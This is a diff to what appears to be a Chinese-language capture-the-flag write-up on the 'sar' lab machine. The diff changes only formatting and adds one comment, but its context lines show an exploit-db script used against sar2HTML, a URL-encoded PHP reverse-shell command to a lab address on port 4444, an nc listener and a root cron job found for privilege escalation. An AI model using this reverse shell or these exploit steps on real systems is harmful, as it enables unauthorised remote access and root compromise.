@@ -131,12 +131,15 @@ FirePHP Firefox Plugin 0.7.1 - Remote Command Execution                         
 Shellcodes: No Results
 
 ```
+
 ![IMG](../FILES/sar/img-20220721114624.png)
 ![IMG](../FILES/sar/img-20220721114631.png)
 
 ![IMG](../FILES/sar/img-20220721114822.png)
 ![IMG](../FILES/sar/img-20220721114914.png)
 <br>https://www.exploit-db.com/exploits/49344
+<br>
+
 ```
 └─$ python3 exploit.py                                                                                                                                     1 ⨯
 Enter The url => http://192.168.146.58/sar2HTML/
@@ -164,6 +167,7 @@ sarFILE
 Command => nc
 Command => php%20-r%20'%24sock%3Dfsockopen(%22192.168.146.63%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B'
 ```
+
 ## 提权
 ```
 └─$ nc -nvlp 4444                                                                                                                                          1 ⨯
@@ -271,8 +275,6 @@ cat: write error: Broken pipe
    Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
    Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
 
-
-
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
@@ -282,6 +284,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 */5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
 
 ```
+<br>这里可以看到finally是以sudu权限运行的, 并且每隔5分钟运行一次
 ```
 www-data@sar:/tmp$ cd /var/www/html
 cd /var/www/html
